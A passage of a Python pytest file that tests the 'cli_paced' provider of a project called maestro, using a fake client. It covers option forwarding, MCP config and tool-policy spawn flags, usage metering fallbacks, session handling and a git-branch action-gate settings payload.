"""Tests for the cli_paced reference provider (proposal 056 Step 11 / 058 Phase 4).

:class:`maestro.providers.cli_paced.CliPacedProvider` is the home of the CLI-paced
logic that proposal 056 originally landed behind the standalone
``[sdk] backend = "cli_paced"`` seam; Step 11 folded that adapter *into* this
provider and retired ``maestro.sdk_backends``. These tests drive the *full* path —
a fake ``maestro_sdk`` client stands in for the pty-backed ``AsyncClient`` (no real
``claude`` process is spawned) — and pin:

* the fully-qualified :class:`~maestro.providers.base.Capabilities` descriptor
  (every flag ``True``, proposal 061 Step 11) and structural ``Provider``
  conformance,
* type re-pack into the honest-unmeasured usage shape (zero counts,
  ``total_cost_usd=None``, and the Step 13 ``unmetered=True`` flag) whenever the
  transcript sidecar is unreadable,
* the exhaustive ``MaestroSDKError → SDKError(category)`` translation table,
* fail-loud rejection of the option fields the CLI path still cannot honour
  (``hooks`` other than the recognised task action-gate; ``output_format`` on a
  session), and the silent-drop contract for fields delegated to the CLI's own
  config,
* action-gate replication (proposal 066): a recognised
  ``tool_gating.make_task_tool_hooks`` mapping injects the ``--settings`` gate
  payload and branch env onto the spawn instead of raising,
* the session lifecycle, system-prompt threading, and the proposal 061
  forwarding paths: ``resume_session_id`` / ``initial_prompt`` into
  ``AsyncClient.create_session`` and the adapted text-only ``complete_on``.
"""

from __future__ import annotations

import dataclasses
import io
import json
import logging
import os
import shlex
import sys
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock

import jsonschema
import pytest

import maestro.providers.cli_paced as cli_paced
import maestro.sdk as sdk_mod
from maestro import tool_surface, transcript
from maestro.cost_tracking import PlanHeadroom
from maestro.diagnostics import ContextWindowSnapshot
from maestro.logs import iter_transcript_records
from maestro.providers.base import Capabilities, Provider, QueryOptions, SDKError
from maestro.providers.cli_paced import CliPacedProvider
from maestro.providers.cli_paced_gate import (
    GATE_BRANCH_ENV,
    GATE_CURRENT_BRANCH_ENV,
    GATE_STRIP_REDIRECTIONS_ENV,
    GATE_SUBCOMMAND,
    allowed_branches_to_env,
    build_gate_settings,
    current_branch_from_env,
    current_branch_to_env,
    gate_hook_command,
    run_gate_bash_hook,
    serialize_gate_settings,
    strip_redirections_from_env,
    strip_redirections_to_env,
)
from maestro.sdk import LONG_CONTEXT_BETA, ErrorCategory, QueryResult, ToolCall
from maestro.tool_gating import make_task_tool_hooks
from maestro_sdk import (
    ApprovalRequiredError,
    CLIExitedError,
    CLINotFoundError,
    CLITimeoutError,
    ContextBucket,
    ContextReport,
    CostReport,
    MaestroSDKError,
    RateLimitError,
    SessionExpiredError,
    SlashProbeMarkers,
    UsageReport,
)
from maestro_sdk import QueryOptions as CLIQueryOptions
from maestro_sdk import QueryResult as CLIQueryResult
from maestro_sdk import ToolCall as CLIToolCall

# ── fakes (no pty is spawned) ─────────────────────────────────────────────


class _FakeClient:
    """Stands in for maestro_sdk.AsyncClient without spawning a pty."""

    def __init__(self, result: Any = None, error: Exception | None = None) -> None:
        self._result = result if result is not None else CLIQueryResult(response="ok")
        self._error = error
        self.queries: list[tuple[str, Any]] = []
        self.session: _FakeSession | None = None
        # (initial_prompt, resume) recorded by create_session, mirroring the
        # AsyncClient.create_session signature the provider forwards into.
        self.session_args: tuple[Any, Any] | None = None

    async def query(self, prompt: str, *, options: Any = None) -> Any:
        self.queries.append((prompt, options))
        if self._error is not None:
            raise self._error
        return self._result

    def create_session(
        self, initial_prompt: str | None = None, *, resume: str | None = None
    ) -> _FakeSession:
        self.session = _FakeSession(self)
        self.session_args = (initial_prompt, resume)
        return self.session


class _FakeSession:
    def __init__(self, client: _FakeClient) -> None:
        self._client = client
        self.closed = False
        self.queries: list[tuple[str, Any]] = []
        # Slash-command probe seam (proposal 062 Step 3): record the commands the
        # probe issues and return a per-command snapshot the extractor parses. An
        # unmapped command returns ``""`` (the honest empty redraw); a set
        # ``run_command_error`` makes the probe raise, mirroring a live runner that
        # rate-limited or wedged mid-probe.
        self.commands: list[str] = []
        self.command_snapshots: dict[str, str] = {}
        self.run_command_error: Exception | None = None

    async def query(self, prompt: str, *, options: Any = None) -> Any:
        self.queries.append((prompt, options))
        return await self._client.query(prompt, options=options)

    async def run_command(self, text: str) -> str:
        self.commands.append(text)
        if self.run_command_error is not None:
            raise self.run_command_error
        return self.command_snapshots.get(text, "")

    async def aclose(self) -> None:
        self.closed = True


@pytest.fixture(autouse=True)
def _restore_client_factory() -> Any:
    """Restore the provider's client factory after each test."""
    original = cli_paced._client_factory
    yield
    cli_paced._client_factory = original


@pytest.fixture(autouse=True)
def _restore_cli_paced_config() -> Any:
    """Restore the module-global [sdk.cli_paced] config after each test.

    ``configure_cli_paced`` mutates module state; without this an override set by
    one test would leak into the next (e.g. a configured stream-idle skewing a
    later default-deadline assertion)."""
    cadence = cli_paced._cadence_overrides
    idle = cli_paced._stream_idle_timeout_seconds
    probe_enabled = cli_paced._probe_metrics_enabled
    probe_every = cli_paced._probe_metrics_every
    probe_markers = cli_paced._probe_markers
    marker_pack = cli_paced._marker_pack
    idle_drift = cli_paced._idle_drift_warned
    session_id_drift = cli_paced._session_id_drift_warned
    last_ctx = cli_paced._last_context_window
    last_headroom = cli_paced._last_plan_headroom
    yield
    cli_paced._cadence_overrides = cadence
    cli_paced._stream_idle_timeout_seconds = idle
    cli_paced._probe_metrics_enabled = probe_enabled
    cli_paced._probe_metrics_every = probe_every
    cli_paced._probe_markers = probe_markers
    cli_paced._marker_pack = marker_pack
    cli_paced._idle_drift_warned = idle_drift
    cli_paced._session_id_drift_warned = session_id_drift
    cli_paced._last_context_window = last_ctx
    cli_paced._last_plan_headroom = last_headroom


def _install_fake(
    *, result: Any = None, error: Exception | None = None
) -> tuple[_FakeClient, dict[str, Any]]:
    """Point the provider's client factory at a fake client.

    Returns the fake client and a dict capturing the options it was built with.
    """
    client = _FakeClient(result=result, error=error)
    captured: dict[str, Any] = {}

    def factory(
        options: CLIQueryOptions, command: Any = None, env: Any = None
    ) -> _FakeClient:
        captured["options"] = options
        captured["command"] = command
        captured["env"] = env
        return client

    cli_paced._client_factory = factory
    return client, captured


# ── contract surface ─────────────────────────────────────────────────────


def test_satisfies_provider_protocol() -> None:
    assert isinstance(CliPacedProvider(), Provider)


def test_capabilities_are_fully_qualified() -> None:
    """All eight flags are True (proposal 061 Step 11): each is vouched for by a
    CLI-side mechanism — persistent pty session + ``--resume``, the tool-adapter
    ``--mcp-config``, external-MCP/tool-policy spawn flags, child-env beta and
    thinking budget, client-side structured output, transcript-sidecar metering,
    and the parser-driven ``complete_on`` early exit."""
    assert CliPacedProvider.capabilities == Capabilities(
        sessions=True,
        in_process_tools=True,
        remote_mcp=True,
        extended_thinking=True,
        long_context=True,
        structured_output=True,
        usage_metering=True,
        streaming=True,
    )


# ── query delegation + usage shape ────────────────────────────────────────


@pytest.mark.asyncio
async def test_query_repacks_result(mem_fs: dict[str, str]) -> None:
    # ``cwd="/work"`` points the Step 10 transcript-sidecar read (triggered by
    # the ``session_id``) at a guaranteed-absent project dir, so the read raises
    # ``FileNotFoundError`` and usage falls back to the honest unmetered shape —
    # this test pins the re-pack, not the metering.
    client, _ = _install_fake(
        result=CLIQueryResult(
            response="hi",
            tool_calls=[CLIToolCall(name="Bash", args={"raw": "ls"})],
            session_id="s1",
        )
    )
    out = await CliPacedProvider().query(
        "p", options=QueryOptions(caller="contemplate", cwd="/work")
    )
    assert out.response == "hi"
    assert out.tool_calls == [ToolCall(name="Bash", input={"raw": "ls"})]
    assert out.session_id == "s1"
    assert out.usage.unmetered is True
    assert client.queries[0][0] == "p"


@pytest.mark.asyncio
async def test_query_usage_is_honest_unmeasured() -> None:
    """The CLI surfaces no counts: zeros with ``total_cost_usd=None`` and the
    Step 13 ``unmetered=True`` flag.

    The flag marks the row as *unmeasured* (not measured-as-zero) so cost
    aggregation skips it and the dashboard renders ``—`` — the honest
    "no metering" semantics ``usage = None`` was meant to convey.
    """
    _install_fake()
    out = await CliPacedProvider().query("p", options=QueryOptions(caller="evolve"))
    assert out.usage.caller == "evolve"
    assert out.usage.total_tokens == 0
    assert out.usage.total_cost_usd is None
    assert out.usage.unmetered is True


@pytest.mark.asyncio
async def test_query_usage_carries_no_effort() -> None:
    """No effort flag reaches the CLI child, so ``effort`` stays ``None`` even
    when the call declares one (proposal 140) — ``QueryUsage`` never carries
    an effort the model did not receive."""
    _install_fake()
    out = await CliPacedProvider().query(
        "p", options=QueryOptions(caller="evolve", effort="high"),
    )
    assert out.usage.effort is None


@pytest.mark.asyncio
async def test_metering_capability_does_not_fake_unreadable_sidecar() -> None:
    """``usage_metering=True`` vouches for the sidecar *mechanism* (061 Step 10),
    not for every row: a turn whose transcript sidecar is absent still re-packs
    into the honest ``unmetered=True`` fallback rather than a fabricated count —
    the per-row flag stays the source of truth for whether *this* row measured."""
    _install_fake()
    provider = CliPacedProvider()
    assert provider.capabilities.usage_metering is True
    out = await provider.query("p", options=QueryOptions(caller="evolve"))
    assert out.usage.unmetered is True


@pytest.mark.asyncio
async def test_unmetered_fallback_row_stamps_provider() -> None:
    """Attribution (067 Step 2): the unmetered zero-fill names its producer,
    so unknown spend is readable as unknown-by-design under cli_paced."""
    _install_fake()
    out = await CliPacedProvider().query("p", options=QueryOptions(caller="evolve"))
    assert out.usage.unmetered is True
    assert out.usage.provider == "cli_paced"


@pytest.mark.asyncio
async def test_query_threads_cwd_and_timeout() -> None:
    _, captured = _install_fake()
    await CliPacedProvider().query(
        "p", options=QueryOptions(cwd="/work"), stream_idle_timeout_seconds=42.0
    )
    assert captured["options"].cwd == "/work"
    assert captured["options"].stream_idle_timeout_seconds == 42.0


@pytest.mark.asyncio
async def test_query_threads_system_prompt() -> None:
    client, _ = _install_fake()
    await CliPacedProvider().query("do it", system="You are X")
    assert client.queries[0][0] == "You are X\n\ndo it"


@pytest.mark.asyncio
async def test_query_without_system_sends_prompt_verbatim() -> None:
    client, _ = _install_fake()
    await CliPacedProvider().query("do it")
    assert client.queries[0][0] == "do it"


# ── fail-loud on unsupported features ─────────────────────────────────────


@pytest.mark.asyncio
async def test_query_rejects_unmappable_beta() -> None:
    """A requested beta outside the mappable set has no CLI-side mechanism and
    raises rather than being silently dropped (proposal 061 Step 7). The
    long-context beta, by contrast, is now mapped onto the child env — see
    ``test_query_threads_long_context_beta_env``."""
    _install_fake()
    with pytest.raises(NotImplementedError, match="SDK betas"):
        await CliPacedProvider().query(
            "p", options=QueryOptions(betas=["some-other-beta-2099-01-01"])
        )


@pytest.mark.asyncio
async def test_query_rejects_hooks() -> None:
    """``hooks`` carries in-process callbacks the CLI path cannot run; anything
    that is not the recognised task action-gate (proposal 066 replicates that
    one subprocess-natively) must raise rather than silently drop, since
    discarding a hook could widen tool access beyond what the caller requested.
    """
    _install_fake()
    with pytest.raises(NotImplementedError, match="hooks"):
        await CliPacedProvider().query("p", options=QueryOptions(hooks={"PreToolUse": []}))


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "field_kwargs",
    [
        # Documented "delegated to the CLI's own config" fields. The contract is
        # that they pass through silently — the CLI re-resolves them. This test
        # pins the contract so a future regression that starts rejecting them
        # (or, worse, faking them) fails here first.
        {"model": "claude-opus-4-7"},
        {"fallback_model": "claude-haiku-4-5"},
        {"effort": "high"},
        {"task_budget_tokens": 2048},
        # ``bypass_warning_throttle`` is documented as "inert under this
        # provider" — the agent-SDK warning throttle doesn't run in the CLI
        # path, so the flag has no analogue here. Same silent-drop contract
        # as the delegated fields; pinning the case prevents a future
        # regression that adds it to ``_reject_unsupported_options``.
        {"bypass_warning_throttle": True},
    ],
)
async def test_query_passes_through_delegated_options(
    field_kwargs: dict[str, Any],
) -> None:
    """Delegated-to-CLI fields are dropped silently (no raise, no forwarding).

    Mirrors the module-docstring contract for the second-category fields in
    ``_reject_unsupported_options``. If this test starts failing because a
    raise was added, update the docstring and ``_reject_unsupported_options``
    together — they are one contract.
    """
    client, captured = _install_fake()
    await CliPacedProvider().query("p", options=QueryOptions(**field_kwargs))
    # The field never reaches the CLI side: the prompt is forwarded verbatim,
    # and the projected CLIQueryOptions carries only its own schema —
    # cwd, system, session_id, startup_timeout_seconds, stream_idle_timeout_seconds,
    # idle_quiescence_seconds, complete_on — none of them populated from the
    # delegated agent-side option. ``idle_quiescence_seconds`` and ``session_id``
    # are maestro_sdk native fields (proposal 081) the provider does not thread yet
    # (later 081 steps do), so they are present in the schema but left at their
    # defaults here.
    # Pinning the field set positively (rather than asserting ``not hasattr`` on a
    # frozen dataclass that never declared the field in the first place) is what
    # catches a future regression that smuggles a delegated field through.
    assert client.queries[0][0] == "p"
    projected = {f.name for f in dataclasses.fields(captured["options"])}
    assert projected == {
        "cwd",
        "system",
        "session_id",
        "startup_timeout_seconds",
        "stream_idle_timeout_seconds",
        "idle_quiescence_seconds",
        "complete_on",
    }
    # And positively: every projected field carries its CLIQueryOptions
    # default. The schema check above catches a *new* field on CLIQueryOptions
    # silently smuggled through; this defaults check catches an *existing*
    # field being populated from the delegated agent-side option.
    defaults = CLIQueryOptions()
    assert captured["options"].cwd is defaults.cwd
    assert captured["options"].system is defaults.system
    assert captured["options"].session_id is defaults.session_id
    assert captured["options"].startup_timeout_seconds == defaults.startup_timeout_seconds
    assert captured["options"].stream_idle_timeout_seconds == defaults.stream_idle_timeout_seconds
    assert captured["options"].idle_quiescence_seconds is defaults.idle_quiescence_seconds
    assert captured["options"].complete_on is defaults.complete_on


@pytest.mark.asyncio
async def test_query_threads_complete_on_as_text_only_predicate() -> None:
    """``complete_on`` no longer raises (proposal 061 Step 3): the two-arg
    Maestro predicate is adapted onto the driver's text-only shape, receiving
    ``None`` for the message — the CLI path has no message object."""
    calls: list[tuple[Any, str]] = []

    def predicate(message: Any, accumulated_text: str) -> bool:
        calls.append((message, accumulated_text))
        return len(accumulated_text) > 3

    _, captured = _install_fake()
    await CliPacedProvider().query("p", complete_on=predicate)
    adapted = captured["options"].complete_on
    assert adapted is not None
    assert adapted("hi\nmid") is False
    assert adapted("long enough\nmid-row") is True
    assert calls == [(None, "hi\n"), (None, "long enough\n")]


def test_adapted_predicate_sees_only_complete_rows() -> None:
    """The driver runs the predicate per pty snapshot (#4112): a buffer with no
    newline yields ``""`` and a trailing half-drawn row is hidden."""
    seen: list[str] = []

    def pred(_message: Any, text: str) -> bool:
        seen.append(text)
        return False

    adapted = cli_paced._adapt_complete_on(pred)
    assert adapted is not None
    assert adapted.predicate("no newline yet") is False
    assert adapted.predicate("row one\nrow tw") is False
    assert seen == ["", "row one\n"]
    assert adapted.fired_prefix is None


def _firing_on_done(_message: Any, text: str) -> bool:
    return text.endswith("DONE\n")


@pytest.mark.asyncio
async def test_query_trims_early_exit_response_to_fired_prefix(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """An early-exit response carrying a half-drawn row past the judged prefix is
    trimmed to that prefix on the one-shot path (#4112)."""
    client, captured = _install_fake(
        result=CLIQueryResult(response="body\nDONE\npartial ro")
    )
    original_query = client.query

    async def _query(prompt: str, *, options: Any = None) -> Any:
        # Stand in for the driver firing the forwarded predicate mid-stream.
        assert captured["options"].complete_on("body\nDONE\npartial ro") is True
        return await original_query(prompt, options=options)

    monkeypatch.setattr(client, "query", _query)
    out = await CliPacedProvider().query("p", complete_on=_firing_on_done)
    assert out.response == "body\nDONE\n"


@pytest.mark.asyncio
async def test_query_leaves_response_untouched_when_predicate_never_fired() -> None:
    _install_fake(result=CLIQueryResult(response="body\npartial ro"))
    out = await CliPacedProvider().query("p", complete_on=_firing_on_done)
    assert out.response == "body\npartial ro"


def test_trim_leaves_response_that_no_longer_starts_with_prefix() -> None:
    adapted = cli_paced._adapt_complete_on(_firing_on_done)
    assert adapted is not None
    assert adapted.predicate("a\nDONE\nx") is True
    result = CLIQueryResult(response="repainted\nDONE\n")
    assert adapted.trim(result) is result


@pytest.mark.asyncio
async def test_query_on_session_trims_early_exit_response_to_fired_prefix(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    client, _ = _install_fake(
        result=CLIQueryResult(response="body\nDONE\npartial ro")
    )
    provider = CliPacedProvider()
    session = await provider.create_session()
    assert client.session is not None
    fake_session = client.session
    original_query = fake_session.query

    async def _query(prompt: str, *, options: Any = None) -> Any:
        assert options.complete_on("body\nDONE\npartial ro") is True
        return await original_query(prompt, options=options)

    monkeypatch.setattr(fake_session, "query", _query)
    out = await provider.query_on_session(session, "p", complete_on=_firing_on_done)
    assert out.response == "body\nDONE\n"


@pytest.mark.asyncio
async def test_query_without_complete_on_leaves_options_predicate_unset() -> None:
    _, captured = _install_fake()
    await CliPacedProvider().query("p")
    assert captured["options"].complete_on is None


@pytest.mark.asyncio
async def test_create_session_forwards_resume_id() -> None:
    """``resume_session_id`` forwards into ``AsyncClient.create_session`` so the
    driver spawns ``claude --resume <id>`` (proposal 061 Step 2)."""
    client, _ = _install_fake()
    await CliPacedProvider().create_session(resume_session_id="abc")
    assert client.session_args == (None, "abc")


@pytest.mark.asyncio
async def test_create_session_forwards_initial_prompt_with_system() -> None:
    """The connect-time seed is delivered as the session's first turn, composed
    with the baseline system prompt (the driver threads no separate system)."""
    client, _ = _install_fake()
    await CliPacedProvider().create_session("first turn", system="SYS")
    assert client.session_args == ("SYS\n\nfirst turn", None)


@pytest.mark.asyncio
async def test_create_session_without_seed_passes_none() -> None:
    """No seed → ``None`` reaches the driver (the system prompt alone never
    becomes a phantom first turn)."""
    client, _ = _install_fake()
    await CliPacedProvider().create_session(system="SYS")
    assert client.session_args == (None, None)


@pytest.mark.asyncio
async def test_create_session_rejects_unsupported_options() -> None:
    """``create_session`` must pass options through ``_reject_unsupported_options``.

    The module docstring documents that ``create_session`` rejects the shared
    unsupported fields. This test pins that contract so removing the
    ``_reject_unsupported_options(options)`` call inside ``create_session``
    would cause an immediate regression. ``hooks`` stands in for the field the
    shared check still rejects — ``mcp_servers`` is forwarded (Step 5), the
    long-context ``betas`` maps to the child env (Step 7), and ``output_format``
    is now query-path-supported and rejected by ``create_session``'s *own*
    session-specific check (see ``test_create_session_rejects_output_format``),
    not by ``_reject_unsupported_options``.
    """
    _install_fake()
    with pytest.raises(NotImplementedError, match="hooks"):
        await CliPacedProvider().create_session(
            options=QueryOptions(hooks={"PreToolUse": []})
        )


@pytest.mark.asyncio
async def test_create_session_rejects_output_format() -> None:
    """A session cannot enforce structured output — ``query_on_session`` does no
    validation, so honouring ``output_format`` there would silently yield ``None``
    on follow-up turns. ``create_session`` rejects it loud (proposal 061 Step 9);
    the one-shot ``query`` path is where structured output is supported."""
    _install_fake()
    with pytest.raises(NotImplementedError, match="output_format"):
        await CliPacedProvider().create_session(
            options=QueryOptions(output_format={"type": "json_schema"})
        )


@pytest.mark.asyncio
async def test_query_on_session_threads_complete_on_per_call() -> None:
    """A per-call ``complete_on`` reaches the driver's options for that turn only
    — it is never baked into the session's stored options, so the next
    predicate-free turn runs unbounded again.

    The adapted predicate forwards to the 2-arg original with a ``None`` message
    (the repainting TUI exposes no message object), matching the ``query`` path.
    """
    client, _ = _install_fake()
    provider = CliPacedProvider()
    session = await provider.create_session()
    seen: list[tuple[Any, str]] = []

    def pred(message: Any, text: str) -> bool:
        seen.append((message, text))
        return text == "x\n"

    await provider.query_on_session(session, "p", complete_on=pred)
    assert client.session is not None
    _prompt, sent_opts = client.session.queries[0]
    assert sent_opts.complete_on is not None
    assert sent_opts.complete_on("x\n") is True
    assert sent_opts.complete_on("y\n") is False
    assert seen == [(None, "x\n"), (None, "y\n")]
    assert session.options.complete_on is None
    await provider.query_on_session(session, "q")
    _prompt2, sent_opts2 = client.session.queries[1]
    assert sent_opts2.complete_on is None


# ── external MCP forwarding (proposal 061 Step 5) ─────────────────────────


def _parse_mcp_config(command: Any) -> dict[str, Any]:
    """Extract the ``{"mcpServers": {...}}`` payload from a spawn command.

    The command is ``["claude", "--mcp-config", <json>]``; this returns the
    decoded JSON so a test asserts on server entries rather than raw text.
    """
    import json

    assert command is not None
    assert command[0] == "claude"
    assert command[1] == "--mcp-config"
    parsed: dict[str, Any] = json.loads(command[2])
    return parsed


@pytest.mark.asyncio
async def test_query_forwards_external_mcp_servers() -> None:
    """``options.mcp_servers`` no longer raises: external stdio entries fold into
    a ``--mcp-config`` payload on the spawn command instead."""
    _, captured = _install_fake()
    servers = {
        "github": {"command": "docker", "args": ["run", "gh-mcp"], "env": {"T": "x"}},
        "fetch": {"command": "uvx", "args": ["mcp-server-fetch"]},
    }
    await CliPacedProvider().query("p", options=QueryOptions(mcp_servers=servers))
    payload = _parse_mcp_config(captured["command"])
    assert payload["mcpServers"] == servers


@pytest.mark.asyncio
async def test_query_filters_inprocess_mcp_servers() -> None:
    """In-process SDK-instance servers cannot be hosted by a separate ``claude``
    process, so they are selected out; only the external stdio entries appear."""
    _, captured = _install_fake()
    servers = {
        "github": {"command": "docker", "args": ["run", "gh-mcp"]},
        # An in-process SDK server instance — not command-shaped, not forwardable.
        "journal": {"type": "sdk", "name": "journal", "instance": object()},
    }
    await CliPacedProvider().query("p", options=QueryOptions(mcp_servers=servers))
    payload = _parse_mcp_config(captured["command"])
    assert list(payload["mcpServers"]) == ["github"]


@pytest.mark.asyncio
async def test_query_inprocess_only_mcp_servers_emit_no_config() -> None:
    """When every entry is an in-process server, there is nothing forwardable, so
    no ``--mcp-config`` is emitted."""
    _, captured = _install_fake()
    servers = {"journal": {"type": "sdk", "name": "journal", "instance": object()}}
    await CliPacedProvider().query("p", options=QueryOptions(mcp_servers=servers))
    assert "--mcp-config" not in captured["command"]


@pytest.mark.asyncio
async def test_query_without_mcp_servers_emits_no_config() -> None:
    """A query with no MCP servers emits no ``--mcp-config``; the command carries
    only the always-on ungated-shell denial (issue #4381)."""
    _, captured = _install_fake()
    await CliPacedProvider().query("p")
    assert captured["command"][1:] == ["--disallowedTools", "Agent", "Monitor"]


@pytest.mark.asyncio
async def test_create_session_bakes_external_mcp_config_into_command() -> None:
    """A session built with external MCP servers spawns with ``--mcp-config`` so
    every turn it drives inherits the same external servers."""
    _, captured = _install_fake()
    servers = {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}
    await CliPacedProvider().create_session(options=QueryOptions(mcp_servers=servers))
    payload = _parse_mcp_config(captured["command"])
    assert payload["mcpServers"] == servers


@pytest.mark.asyncio
async def test_create_session_bakes_tool_policy_into_command() -> None:
    """A session built with tool policy spawns with the ``--tools`` /
    ``--allowedTools`` / ``--disallowedTools`` flags so every turn it drives
    inherits the same tool policy — the session-side equivalent of the one-shot
    ``query`` forwarding tests. Without this the one-shot tests alone would not
    catch a regression that dropped tool policy from the session spawn command."""
    _, captured = _install_fake()
    await CliPacedProvider().create_session(
        options=QueryOptions(
            tools=["Bash(git *)", "Read"],
            allowed_tools=["Read"],
            disallowed_tools=["Write"],
        )
    )
    assert _flag_values(captured["command"], "--tools") == ["Bash(git *)", "Read"]
    assert _flag_values(captured["command"], "--allowedTools") == ["Read"]
    assert _flag_values(captured["command"], "--disallowedTools") == ["Write", "Monitor"]


def test_external_mcp_servers_handles_none_and_empty() -> None:
    """The selector returns ``{}`` for ``None`` options, ``None`` mcp_servers, and
    a non-dict entry (defensively skipped)."""
    from maestro.providers.cli_paced import _external_mcp_servers

    assert _external_mcp_servers(None) == {}
    assert _external_mcp_servers(QueryOptions()) == {}
    assert _external_mcp_servers(QueryOptions(mcp_servers={})) == {}
    # A non-dict value is not a stdio spec and is skipped without raising.
    assert _external_mcp_servers(QueryOptions(mcp_servers={"bad": "nope"})) == {}


def test_external_mcp_servers_forwards_serena_command_entry() -> None:
    """The serena symbol-retrieval server is a command-shaped stdio spec, so

    the cli_paced provider forwards it to the spawned ``claude`` unchanged
    (proposal 084 Step 5) — the read-only retrieval seam reaches this provider.
    """
    from maestro.config import Config
    from maestro.providers.cli_paced import _external_mcp_servers

    mcp_servers = Config(serena_mcp_enabled=True).mcp_servers_config()
    selected = _external_mcp_servers(QueryOptions(mcp_servers=mcp_servers))
    assert "serena" in selected
    assert selected["serena"]["command"] == "uvx"


def test_external_mcp_servers_warns_on_dropped_unforwardable_specs(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """A mapping with one command-shaped and one instance-shaped entry forwards
    the first and logs a WARNING naming the dropped second (proposal 076 Step 3),
    so the tool-surface narrowing is a loud signal instead of a silent drop."""
    from maestro.providers.cli_paced import _external_mcp_servers

    servers = {
        "github": {"command": "docker", "args": ["run", "gh-mcp"]},
        # A future SDK-instance spec the Step 2 adapter does not cover.
        "journal": {"type": "sdk", "name": "journal", "instance": object()},
    }
    logger_name = "maestro.providers.cli_paced"
    with caplog.at_level(logging.WARNING, logger=logger_name):
        selected = _external_mcp_servers(QueryOptions(mcp_servers=servers))
    assert list(selected) == ["github"]
    warnings = [r for r in caplog.records if r.name == logger_name]
    assert len(warnings) == 1
    message = warnings[0].getMessage()
    # The WARNING names the dropped server, not the forwarded one.
    assert "journal" in message
    assert "github" not in message


def test_external_mcp_servers_all_forwardable_logs_nothing(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """An all-command-shaped mapping (external stdio + Step 2 launcher entries)
    forwards everything and logs no WARNING — the loud signal fires only on a
    genuinely dropped spec (proposal 076 Step 3)."""
    from maestro.providers.cli_paced import _external_mcp_servers

    servers = {
        "github": {"command": "docker", "args": ["run", "gh-mcp"]},
        # A Step 2 launcher entry for an in-process server is now command-shaped.
        "journal": {"command": "maestro", "args": ["_mcp-serve", "journal"]},
    }
    logger_name = "maestro.providers.cli_paced"
    with caplog.at_level(logging.WARNING, logger=logger_name):
        selected = _external_mcp_servers(QueryOptions(mcp_servers=servers))
    assert list(selected) == ["github", "journal"]
    assert [r for r in caplog.records if r.name == logger_name] == []


# ── tool-policy + max_turns forwarding (proposal 061 Step 6) ──────────────


def _flag_values(command: Any, flag: str) -> list[str]:
    """Return the variadic values following *flag* in a spawn command.

    The CLI tool-policy / MCP flags are variadic, so collect every token after
    *flag* up to the next ``--``-prefixed flag (or end of command). An empty
    string (``--tools ""``) is a value, not a flag, so it is collected.
    """
    assert command is not None
    start = command.index(flag) + 1
    values: list[str] = []
    for token in command[start:]:
        if token.startswith("--"):
            break
        values.append(token)
    return values


@pytest.mark.asyncio
async def test_query_forwards_allowed_tools() -> None:
    """``allowed_tools`` folds onto the CLI ``--allowedTools`` flag (no raise)."""
    _, captured = _install_fake()
    await CliPacedProvider().query(
        "p", options=QueryOptions(allowed_tools=["Read", "Edit"])
    )
    assert _flag_values(captured["command"], "--allowedTools") == ["Read", "Edit"]


@pytest.mark.asyncio
async def test_query_forwards_disallowed_tools() -> None:
    """``disallowed_tools`` folds onto the CLI ``--disallowedTools`` flag."""
    _, captured = _install_fake()
    await CliPacedProvider().query("p", options=QueryOptions(disallowed_tools=["Write"]))
    assert _flag_values(captured["command"], "--disallowedTools") == ["Write", "Monitor"]


@pytest.mark.asyncio
async def test_query_forwards_tools_base_set() -> None:
    """A non-empty ``tools`` base set folds onto ``--tools`` with each name as its
    own argv token (so a space-containing spec stays one unambiguous token)."""
    _, captured = _install_fake()
    await CliPacedProvider().query(
        "p", options=QueryOptions(tools=["Bash(git *)", "Read"])
    )
    assert _flag_values(captured["command"], "--tools") == ["Bash(git *)", "Read"]


@pytest.mark.asyncio
async def test_query_empty_tools_emits_disable_all() -> None:
    """``tools=[]`` (distinct from ``tools=None``) emits ``--tools ""`` — the CLI's
    documented "disable all tools" form — not an omitted flag."""
    _, captured = _install_fake()
    await CliPacedProvider().query("p", options=QueryOptions(tools=[]))
    assert _flag_values(captured["command"], "--tools") == [""]


@pytest.mark.asyncio
async def test_query_empty_allow_deny_emits_no_flag() -> None:
    """An empty ``allowed_tools`` is a no-op filter, so no flag is emitted; an
    empty ``disallowed_tools`` still carries the ungated-shell denial (#4381)."""
    _, captured = _install_fake()
    await CliPacedProvider().query(
        "p", options=QueryOptions(allowed_tools=[], disallowed_tools=[])
    )
    assert captured["command"][1:] == ["--disallowedTools", "Monitor"]


@pytest.mark.asyncio
async def test_query_tool_policy_combines_with_external_mcp() -> None:
    """Tool-policy flags and ``--mcp-config`` ride the same spawn command, each
    variadic group cleanly terminated by the next ``--`` flag."""
    _, captured = _install_fake()
    servers = {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}
    await CliPacedProvider().query(
        "p",
        options=QueryOptions(mcp_servers=servers, allowed_tools=["Read"]),
    )
    # ``--mcp-config`` is emitted first, so the payload sits at command[2].
    payload = _parse_mcp_config(captured["command"])
    assert payload["mcpServers"] == servers
    assert _flag_values(captured["command"], "--allowedTools") == ["Read"]


# ── action-gate replication (proposal 066) ────────────────────────────────


def _gate_settings(command: Any) -> dict[str, Any]:
    """Parse the inline ``--settings`` JSON payload off a spawn command."""
    values = _flag_values(command, "--settings")
    assert len(values) == 1
    parsed: dict[str, Any] = json.loads(values[0])
    return parsed


#: The env block the gate builders produce for the ``maestro/task/abc`` set —
#: the JSON-encoded owned-branch list the CLI hook subprocess decodes back
#: (proposal 093).  A single-element set has one stable ordering.
_ABC_ENV = {GATE_BRANCH_ENV: '["maestro/task/abc"]'}


def test_build_gate_settings_registers_hook_and_branch() -> None:
    """Step 2 acceptance: the settings payload registers a ``PreToolUse`` Bash
    hook pointing at the gate subcommand and carries the supplied branch set,
    JSON-encoded — asserted against the structure the claude CLI consumes, no
    filesystem write anywhere on the path."""
    settings = build_gate_settings(frozenset({"maestro/task/abc"}))
    matchers = settings["hooks"]["PreToolUse"]
    assert len(matchers) == 1
    assert matchers[0]["matcher"] == "Bash"
    assert matchers[0]["hooks"] == [
        {"type": "command", "command": gate_hook_command()}
    ]
    assert settings["env"] == _ABC_ENV


def test_build_gate_settings_matcher_follows_gate_matched_tools(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(
